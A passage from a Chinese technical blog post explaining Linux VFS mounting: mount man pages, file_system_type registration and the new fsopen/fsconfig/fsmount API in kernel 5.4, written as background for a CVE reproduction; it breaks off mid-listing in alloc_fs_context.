class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs inform7">SYNOPSIS<br>       mount <span class="hljs-comment">[-h|-V]</span><br><br>       mount <span class="hljs-comment">[-l]</span> <span class="hljs-comment">[-t fstype]</span><br><br>       mount -a <span class="hljs-comment">[-fFnrsvw]</span> <span class="hljs-comment">[-t fstype]</span> <span class="hljs-comment">[-O optlist]</span><br><br>       mount <span class="hljs-comment">[-fnrsvw]</span> <span class="hljs-comment">[-o options]</span> device|mountpoint<br><br>       mount <span class="hljs-comment">[-fnrsvw]</span> <span class="hljs-comment">[-t fstype]</span> <span class="hljs-comment">[-o options]</span> device mountpoint<br><br>       mount --bind|--rbind|--move olddir newdir<br><br>       mount --make-<span class="hljs-comment">[shared|slave|private|unbindable|rshared|rslave|rprivate|runbindable]</span> mountpoint<br><br></code></pre></td></tr></table></figure><p>我们通常会采用下面命令来进行挂载</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mount -t xfs <span class="hljs-regexp">/dev/</span>sdb1 -o <span class="hljs-regexp">/mnt/</span>temp<br></code></pre></td></tr></table></figure><p>具体含义就是将&#x2F;dev&#x2F;sdb1设备代表的文件系统以xfs文件系统的格式来挂载到&#x2F;mnt&#x2F;temp目录下，这样就加入到了我们<code>/</code>根目录的文件树当中，这样以来我们才可以正常访问其中内容，除了Linux实际上windows也存在挂载操作，但为了简化我们用户的使用就隐藏了这一点</p><p>除了命令行使用的mount，我们来关注一下代码当中使用的mount系统调用，以下查看手册</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">man</span> <span class="hljs-number">2</span> <span class="hljs-built_in">mount</span><br></code></pre></td></tr></table></figure><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs tcl">mount(<span class="hljs-number">2</span>)                                                                                              System Calls Manual                                                                                              mount(<span class="hljs-number">2</span>)<br><br>NAME<br>       mount - mount filesystem<br><br>LIBRARY<br>       Standard C library (libc, -lc)<br><br>SYNOPSIS<br><span class="hljs-comment">       #include &lt;sys/mount.h&gt;</span><br><br>       int mount(const char *<span class="hljs-keyword">source</span>, const char *target,<br>                 const char *filesystemtype, unsigned long mountflags,<br>                 const void *_Nullable data);<br><br>DESCRIPTION<br>       mount() 将源指定的文件系统（通常是引用设备的路径名，但也可以是目录或文件的路径名，或虚拟字符串）附加到路径名指定的位置（目录或文件） 在目标中。<br><br>       挂载文件系统需要适当的权限（Linux：CAP_SYS_ADMIN 功能）。<br><br>       Values <span class="hljs-keyword">for</span> the filesystemtype argument supported by the kernel are listed in /<span class="hljs-keyword">proc</span>/filesystems (e.g., &quot;btrfs&quot;, &quot;ext4&quot;, &quot;jfs&quot;, &quot;xfs&quot;, &quot;vfat&quot;, &quot;fuse&quot;, &quot;tmpfs&quot;, &quot;cgroup&quot;, &quot;<span class="hljs-keyword">proc</span>&quot;,  &quot;mqueue&quot;,  &quot;nfs&quot;,  &quot;cifs&quot;,  &quot;iso9660&quot;).<span class="hljs-title"></span><br><span class="hljs-title">       Further</span> types<span class="hljs-title"> may</span> become<span class="hljs-title"> available</span> when<span class="hljs-title"> the</span> appropriate<span class="hljs-title"> modules</span> are<span class="hljs-title"> loaded.</span><br><br>       数据参数由不同的文件系统解释。 通常，它是该文件系统可以理解的一串以逗号分隔的选项。 有关每种文件系统类型可用选项的详细信息，请参阅<span class="hljs-title"> mount(8)。</span> 如果没有选项，则可以将该参数指定为<span class="hljs-title"> NULL。</span><br><span class="hljs-title"></span><br><span class="hljs-title">       A</span> call<span class="hljs-title"> to</span> mount()<span class="hljs-title"> performs</span> one<span class="hljs-title"> of</span> a<span class="hljs-title"> number</span> of<span class="hljs-title"> general</span> types<span class="hljs-title"> of</span> operation,<span class="hljs-title"> depending</span> on<span class="hljs-title"> the</span> bits<span class="hljs-title"> specified</span> in<span class="hljs-title"> mountflags.</span> <span class="hljs-title"> The</span> choice<span class="hljs-title"> of</span> which<span class="hljs-title"> operation</span> to<span class="hljs-title"> perform</span> is<span class="hljs-title"> determined</span> by<span class="hljs-title"> testing</span> the<span class="hljs-title"> bits</span> set<span class="hljs-title"> in</span> <span class="hljs-title"> mountflags,</span><br><span class="hljs-title">       with</span> the<span class="hljs-title"> tests</span> being<span class="hljs-title"> conducted</span> in<span class="hljs-title"> the</span> order<span class="hljs-title"> listed</span> here:<br><br>       •<span class="hljs-title">  Remount</span> an<span class="hljs-title"> existing</span> mount:<span class="hljs-title"> mountflags</span> includes<span class="hljs-title"> MS_REMOUNT.</span><br><br>       •<span class="hljs-title">  Create</span> a<span class="hljs-title"> bind</span> mount:<span class="hljs-title"> mountflags</span> includes<span class="hljs-title"> MS_BIND.</span><br><br>       •<span class="hljs-title">  Change</span> the<span class="hljs-title"> propagation</span> type<span class="hljs-title"> of</span> an<span class="hljs-title"> existing</span> mount:<span class="hljs-title"> mountflags</span> includes<span class="hljs-title"> one</span> of<span class="hljs-title"> MS_SHARED,</span> MS_PRIVATE,<span class="hljs-title"> MS_SLAVE,</span> or<span class="hljs-title"> MS_UNBINDABLE.</span><br><br>       •<span class="hljs-title">  Move</span> an<span class="hljs-title"> existing</span> mount<span class="hljs-title"> to</span> a<span class="hljs-title"> new</span> location:<span class="hljs-title"> mountflags</span> includes<span class="hljs-title"> MS_MOVE.</span><br><br>       •<span class="hljs-title">  Create</span> a<span class="hljs-title"> new</span> mount:<span class="hljs-title"> mountflags</span> includes<span class="hljs-title"> none</span> of<span class="hljs-title"> the</span> above<span class="hljs-title"> flags.</span><br><span class="hljs-title"></span><br><span class="hljs-title">       Each</span> of<span class="hljs-title"> these</span> operations<span class="hljs-title"> is</span> detailed<span class="hljs-title"> later</span> in<span class="hljs-title"> this</span> page.<span class="hljs-title">  Further</span> flags<span class="hljs-title"> may</span> be<span class="hljs-title"> specified</span> in<span class="hljs-title"> mountflags</span> to<span class="hljs-title"> modify</span> the<span class="hljs-title"> behavior</span> of<span class="hljs-title"> mount(),</span> as<span class="hljs-title"> described</span> below.<br><br></code></pre></td></tr></table></figure><h2 id="5-注册文件系统"><a href="#5-注册文件系统" class="headerlink" title="5.注册文件系统"></a>5.注册文件系统</h2><h3 id="1-定义文件系统类型-file-system-type"><a href="#1-定义文件系统类型-file-system-type" class="headerlink" title="1.定义文件系统类型(file_system_type)"></a>1.定义文件系统类型(file_system_type)</h3><p>在注册之前，我们需要先定义一个属于自身文件系统类型的结构体<code>struct file_system_type</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">file_system_type</span> &#123;<br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *name;<br><span class="hljs-type">int</span> fs_flags;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FS_REQUIRES_DEV1 </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FS_BINARY_MOUNTDATA2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FS_HAS_SUBTYPE4</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FS_USERNS_MOUNT8<span class="hljs-comment">/* Can be mounted by userns root */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FS_DISALLOW_NOTIFY_PERM16<span class="hljs-comment">/* Disable fanotify permission events */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FS_RENAME_DOES_D_MOVE32768<span class="hljs-comment">/* FS will handle d_move() during rename() internally. */</span></span><br><span class="hljs-built_in">int</span> (*init_fs_context)(<span class="hljs-keyword">struct</span> fs_context *);<br><span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">fs_parameter_description</span> *parameters;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">dentry</span> *(*mount) (<span class="hljs-keyword">struct</span> file_system_type *, <span class="hljs-type">int</span>,<br>       <span class="hljs-type">const</span> <span class="hljs-type">char</span> *, <span class="hljs-type">void</span> *);<br><span class="hljs-built_in">void</span> (*kill_sb) (<span class="hljs-keyword">struct</span> super_block *);<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">module</span> *owner;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">file_system_type</span> * next;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">hlist_head</span> fs_supers;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">lock_class_key</span> s_lock_key;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">lock_class_key</span> s_umount_key;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">lock_class_key</span> s_vfs_rename_key;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">lock_class_key</span> s_writers_key[SB_FREEZE_LEVELS];<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">lock_class_key</span> i_lock_key;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">lock_class_key</span> i_mutex_key;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">lock_class_key</span> i_mutex_dir_key;<br>&#125;;<br></code></pre></td></tr></table></figure><p>下面我们来分别解释</p><ul><li>name:文件系统的名字，如ext2&#x2F;3,xfs等等</li><li>fs_flags:文件系统类型<ul><li>FS_REQUIRES_DEV:文件系统必须在物理设备上(&#x2F;proc文件系统就不再物理设备上)</li><li>FS_BINARY_MOUNTDATA:当需要mount的文件系统是二进制格式下时</li><li>FS_HAS_SUBTYPE:文件系统有一个子类型。它是从名称中提取出来并作为参数传入的,最常见的就是FUSE，FUSE本是不是真正的文件系统，所以要通过子文件系统类型来区别通过FUSE接口实现的不同文件系统。</li><li>FS_USERNS_MOUNT:可以由root用户挂载(?</li><li>FS_RENAAME_DOES_D_MOVE: 文件系统将会在rename()函数期间处理d_move()</li></ul></li><li>mount():代替早期的get_sb()函数，这个sb指的是超级块，并作为用户挂载此文件系统时所使用的回调函数</li><li>kill_sb():删除内存中所存在的超级块，用作卸载文件系统</li><li>owner:指向实现这个文件系统的模块，通常表示为宏THIS_MODULE</li><li>next:指向链接的下一个文件系统类型</li><li>fs_supers:此文件系统类型的文件系统超级块都串联在该list_head之下</li></ul><p>在定义完对应的文件系统类型结构体之后，我们需要将文件系统注册进内核</p><h3 id="2-注册文件系统"><a href="#2-注册文件系统" class="headerlink" title="2.注册文件系统"></a>2.注册文件系统</h3><p>首先我们可以查看源码<a href="https://elixir.bootlin.com/linux/v5.4.101/source/fs/filesystems.c">fs&#x2F;filesystem.c</a></p><p>里面定义了大量的系统调用，其中文件开头定义了一个全局变量</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">file_system_type</span> *file_systems;<br></code></pre></td></tr></table></figure><p>可以看到该值的类型为一个指向file_system_type的指针，这个指针全局变量指向的是内存中所有存在的文件系统类型</p><p>这里我们就来看相关的注册函数</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *register_filesystem - register a new filesystem</span><br><span class="hljs-comment"> *@fs: the file system structure</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *将传递的文件系统添加到内核为挂载和其他系统调用所知的文件系统列表中。</span><br><span class="hljs-comment"> *  成功时返回 0，错误时返回负 errno 代码.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *The &amp;struct file_system_type that is passed is linked into the kernel </span><br><span class="hljs-comment"> *structures and must not be freed until the file system has been</span><br><span class="hljs-comment"> *unregistered.</span><br><span class="hljs-comment"> */</span><br> <br><span class="hljs-built_in">int</span> register<span class="hljs-constructor">_filesystem(<span class="hljs-params">struct</span> <span class="hljs-params">file_system_type</span> <span class="hljs-operator">*</span> <span class="hljs-params">fs</span>)</span><br>&#123;<br><span class="hljs-built_in">int</span> res = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">struct</span> file_system_type<span class="hljs-operator"> ** </span>p;<br><br><span class="hljs-keyword">if</span> (fs-&gt;parameters<span class="hljs-operator"> &amp;&amp; </span>!fs<span class="hljs-constructor">_validate_description(<span class="hljs-params">fs</span>-&gt;<span class="hljs-params">parameters</span>)</span>)<br>return -EINVAL;<br><br><span class="hljs-constructor">BUG_ON(<span class="hljs-params">strchr</span>(<span class="hljs-params">fs</span>-&gt;<span class="hljs-params">name</span>, &#x27;.&#x27;)</span>);<br><span class="hljs-keyword">if</span> (fs-&gt;next)<br>return -EBUSY;<br>write<span class="hljs-constructor">_lock(&amp;<span class="hljs-params">file_systems_lock</span>)</span>;<br>p = find<span class="hljs-constructor">_filesystem(<span class="hljs-params">fs</span>-&gt;<span class="hljs-params">name</span>, <span class="hljs-params">strlen</span>(<span class="hljs-params">fs</span>-&gt;<span class="hljs-params">name</span>)</span>);<br><span class="hljs-keyword">if</span> (*p)<br>res = -EBUSY;<br><span class="hljs-keyword">else</span><br>*p = fs;<br>write<span class="hljs-constructor">_unlock(&amp;<span class="hljs-params">file_systems_lock</span>)</span>;<br>return res;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里我们观察到重点函数<code>find_filesystem</code>，跟进查看</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-keyword">static</span> struct file_system_type **find_filesystem(<span class="hljs-keyword">const</span> char *name, unsigned len)<br>&#123;<br>struct file_system_type **p;<br><span class="hljs-keyword">for</span> <span class="hljs-function"><span class="hljs-params">(p = &amp;file_systems; *p; p = &amp;(*p)-&gt;next)</span></span><br><span class="hljs-function"><span class="hljs-title">if</span> <span class="hljs-params">(strncmp((*p)-&gt;name, name, len) == <span class="hljs-number">0</span> &amp;&amp;</span></span><br><span class="hljs-params"><span class="hljs-function">    !(*p)-&gt;name[len])</span></span><br><span class="hljs-function"><span class="hljs-title">break</span>;</span><br><span class="hljs-function"><span class="hljs-title">return</span> <span class="hljs-title">p</span>;</span><br><span class="hljs-function">&#125;</span><br></code></pre></td></tr></table></figure><p>就是通过全局变量file_systems通过链条来查找类型而已，找到了就返回对应的file_system_type指针</p><p>这样以来我们的register_filesystem的大致功能就是首先找到对应文件系统类型指针，如果不存在，则将该文件系统类型链入到全局链表的末尾，若存在则返回<code>-EBUSY</code>错误</p><p>经过上述函数，我们的文件系统模块才算是成功注册进内核，然后我们之后就可以使用mount系统调用继续进行挂载</p><h2 id="6-新一代VFS-mount系统调用"><a href="#6-新一代VFS-mount系统调用" class="headerlink" title="6.新一代VFS mount系统调用"></a>6.新一代VFS mount系统调用</h2><p><img src="http://imgsrc.baidu.com/forum/pic/item/738b4710b912c8fc91caf2fcba039245d68821c1.jpg"></p><p>有大哥觉得过去的mount系统调用有许多不同的缺点，在老哥发起整改号召前，传统mount()系统调用一直被广泛使用，即使其中有着些许改变但是仍未改变其接口特性。但是在背后VFS派的AL Viro早就对此系统调用十分不满，希望迎来变革，这一密谋终于在2018年的<a href="https://lwn.net/Articles/753473/">LSFMM大会</a>被公开，他们号召完全改写mount的系统调用接口,他们指出了传统mount系统调用中的一系列难以修复漏洞和bug，在Linux 内核5.2版本后，新一代mount API就被整合到主线Linux</p><p><a href="https://patchwork.kernel.org/project/linux-security-module/cover/153754740781.17872.7869536526927736855.stgit@warthog.procyon.org.uk/">new mount API introduce</a></p><p><img src="http://imgsrc.baidu.com/forum/pic/item/55e736d12f2eb93897687ec393628535e5dd6ffd.jpg"></p><p>上面是<a href="https://arttnba3.cn/2023/01/11/CVE-0X09-CVE-2022-0185/#0x00-%E4%B8%80%E5%88%87%E5%BC%80%E5%A7%8B%E4%B9%8B%E5%89%8D">arttnba3师傅复现博客</a>原话:dog:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta"># mkfs.xfs -f /dev/sdb1</span><br><span class="hljs-meta"># cat old-mount-xfs.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mount.h&gt;</span>  </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span>  </span><br>  <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span> </span>&#123;  <br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">mount</span>(<span class="hljs-string">&quot;/dev/sdb1&quot;</span>, <span class="hljs-string">&quot;/mnt/scratch&quot;</span>, <span class="hljs-string">&quot;xfs&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>)) &#123;  <br>                <span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;mount failed&quot;</span>);  <br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <br>&#125;<br><br><span class="hljs-meta"># gcc -Wall -o old-mount-xfs old-mount-xfs.c</span><br># ./mymount <br><span class="hljs-meta"># cat /proc/mounts |grep sdb1</span><br>/dev/sdb1 /mnt/scratch xfs rw,seclabel,relatime,attr2,inode64,noquota <span class="hljs-number">0</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>如上图所示我们使用传统的mount系统调用十分简单，只需要简单调用上面的函数接口即可，但是当new mount API引入之后，以前<code>臃肿</code>、<code>冗杂</code>的mount系统调用被拆解为一个一个小块来进行实现，</p><p>而我们的new mount API的使用，按照官方文档来说，遵循以下步骤</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lisp">fd = fsopen(<span class="hljs-string">&quot;nfs&quot;</span>)<span class="hljs-comment">;</span><br>fsconfig(<span class="hljs-name">fd</span>, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;option&quot;</span>, <span class="hljs-string">&quot;val&quot;</span>, <span class="hljs-number">0</span>)<span class="hljs-comment">;</span><br>fsconfig(<span class="hljs-name">fd</span>, FSCONFIG_CMD_CREATE, NULL, NULL, <span class="hljs-number">0</span>)<span class="hljs-comment">;</span><br>mfd = fsmount(<span class="hljs-name">fd</span>, MS_NODEV)<span class="hljs-comment">;</span><br>move_mount(<span class="hljs-name">mfd</span>, <span class="hljs-string">&quot;&quot;</span>, AT_FDCWD, <span class="hljs-string">&quot;/mnt&quot;</span>, MOVE_MOUNT_F_EMPTY_PATH)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>下面我们来分别介绍（由于本次复现打算在5.4上面复现，所以下面的源码都是取自kernel.5.4.101）</p><h3 id="1-fsopen-打开文件系统类型"><a href="#1-fsopen-打开文件系统类型" class="headerlink" title="1.fsopen(打开文件系统类型)"></a>1.fsopen(打开文件系统类型)</h3><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 通过名字打开一个文件系统，然后为了接下来的挂载来进行配置</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 我们可以指定将在其中打开文件系统的容器，</span><br><span class="hljs-comment"> * 从而指示将使用哪些名称空间（特别是，哪个网络名称空间将用于网络文件系统）。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-constructor">SYSCALL_DEFINE2(<span class="hljs-params">fsopen</span>, <span class="hljs-params">const</span> <span class="hljs-params">char</span> <span class="hljs-params">__user</span> <span class="hljs-operator">*</span>, <span class="hljs-params">_fs_name</span>, <span class="hljs-params">unsigned</span> <span class="hljs-params">int</span>, <span class="hljs-params">flags</span>)</span><br>&#123;<br><span class="hljs-keyword">struct</span> file_system_type *fs_type;<br><span class="hljs-keyword">struct</span> fs_context *fc;<br>const <span class="hljs-built_in">char</span> *fs_name;<br><span class="hljs-built_in">int</span> ret;<br><br><span class="hljs-keyword">if</span> (!ns<span class="hljs-constructor">_capable(<span class="hljs-params">current</span>-&gt;<span class="hljs-params">nsproxy</span>-&gt;<span class="hljs-params">mnt_ns</span>-&gt;<span class="hljs-params">user_ns</span>, CAP_SYS_ADMIN)</span>)<br>return -EPERM;<br><br><span class="hljs-keyword">if</span> (flags &amp; ~FSOPEN_CLOEXEC)<br>return -EINVAL;<br><br>fs_name = strndup<span class="hljs-constructor">_user(<span class="hljs-params">_fs_name</span>, PAGE_SIZE)</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-constructor">IS_ERR(<span class="hljs-params">fs_name</span>)</span>)<br>return <span class="hljs-constructor">PTR_ERR(<span class="hljs-params">fs_name</span>)</span>;<br><br>fs_type = get<span class="hljs-constructor">_fs_type(<span class="hljs-params">fs_name</span>)</span>; <span class="hljs-comment">//通过我们传入文件系统的名称来获取对应的fs_system_type</span><br>kfree(fs_name);<br><span class="hljs-keyword">if</span> (!fs_type)<br>return -ENODEV;<br><br>fc = fs<span class="hljs-constructor">_context_for_mount(<span class="hljs-params">fs_type</span>, 0)</span>; <span class="hljs-comment">//通过fs_type来准备mount上下文</span><span class="hljs-operator"></span><br><span class="hljs-operator"></span><br><span class="hljs-operator">...</span><br><span class="hljs-operator"></span><br><span class="hljs-operator"></span>&#125;<br></code></pre></td></tr></table></figure><p>这里需要注意我们的fsopen并不是打开了一个位于硬盘上的具体的文件系统(on-disk),而是打开了一个文件系统类型（file_system_type）</p><h4 id="fs-context-for-mount"><a href="#fs-context-for-mount" class="headerlink" title="fs_context_for_mount"></a>fs_context_for_mount</h4><p>其中后面会调用fs_context_for_mount函数，然后调用到<code>alloc_fs_context</code>,其中传入的参数如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">enum</span> <span class="hljs-title class_">fs_context_purpose</span> &#123;<br>FS_CONTEXT_FOR_MOUNT,<span class="hljs-comment">/* New superblock for explicit mount */</span><br>FS_CONTEXT_FOR_SUBMOUNT,<span class="hljs-comment">/* New superblock for automatic submount */</span><br>FS_CONTEXT_FOR_RECONFIGURE,<span class="hljs-comment">/* Superblock reconfiguration (remount) */</span><br>&#125;;<br><br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">fs_context</span> *<span class="hljs-built_in">fs_context_for_mount</span>(<span class="hljs-keyword">struct</span> file_system_type *fs_type,<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> sb_flags)<br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">alloc_fs_context</span>(fs_type, <span class="hljs-literal">NULL</span>, sb_flags, <span class="hljs-number">0</span>,<br>FS_CONTEXT_FOR_MOUNT);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="alloc-fs-context"><a href="#alloc-fs-context" class="headerlink" title="alloc_fs_context"></a>alloc_fs_context</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * alloc_fs_context - Create a filesystem context.</span><br><span class="hljs-comment"> * @fs_type: The filesystem type.</span><br><span class="hljs-comment"> * @reference: The dentry from which this one derives (or NULL)</span><br><span class="hljs-comment"> * @sb_flags: Filesystem/superblock flags (SB_*)</span><br><span class="hljs-comment"> * @sb_flags_mask: Applicable members of @sb_flags</span><br><span class="hljs-comment"> * @purpose: The purpose that this configuration shall be used for.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 打开文件系统并创建挂载上下文。 </span><br><span class="hljs-comment"> * 挂载上下文使用提供的标志进行初始化，并且如果提供了来自另一个超级块（由 @reference 引用）的子挂载/自动挂载，</span><br><span class="hljs-comment"> * 则可能具有从该超级块复制的名称空间等参数。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> fs_context *<span class="hljs-title function_">alloc_fs_context</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file_system_type *fs_type,</span><br><span class="hljs-params">      <span class="hljs-keyword">struct</span> dentry *reference,</span><br><span class="hljs-params">      <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> sb_flags,</span><br><span class="hljs-params">      <span 